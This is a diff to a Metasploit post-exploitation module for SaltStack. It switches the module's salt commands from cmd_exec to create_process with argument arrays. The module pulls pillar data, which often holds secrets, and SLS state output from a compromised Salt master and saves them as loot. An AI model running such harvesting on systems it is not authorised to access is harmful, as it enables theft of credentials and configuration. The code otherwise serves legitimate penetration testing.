@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Post
   def gather_pillars
     print_status('Gathering pillar data')
     begin
-      out = cmd_exec('salt', "'#{datastore['MINIONS']}' --output=yaml pillar.items", datastore['TIMEOUT'])
+      out = create_process('salt', args: ["'#{datastore['MINIONS']}'", '--output=yaml', 'pillar.items'], time_out: datastore['TIMEOUT'])
       vprint_status(out)
       results = YAML.safe_load(out, [Symbol]) # during testing we discovered at times Symbol needs to be loaded
       store_path = store_loot('saltstack_pillar_data_gather', 'application/x-yaml', session, results.to_yaml, 'pillar_gather.yaml', 'SaltStack Salt Pillar Gather')
@@ -194,7 +194,7 @@ class MetasploitModule < Msf::Post
       return
     end
     print_status('Showing SLS')
-    output = cmd_exec('salt', "'#{datastore['MINIONS']}' state.show_sls '*'", datastore['TIMEOUT'])
+    output = create_process('salt', args: ["'#{datastore['MINIONS']}'", 'state.show_sls', "'*'"], time_out: datastore['TIMEOUT'])
     store_path = store_loot('saltstack_sls', 'text/plain', session, output, 'sls.txt', 'SaltStack Salt Master SLS Output')
     print_good("SLS output successfully retrieved and saved to #{store_path}")
 
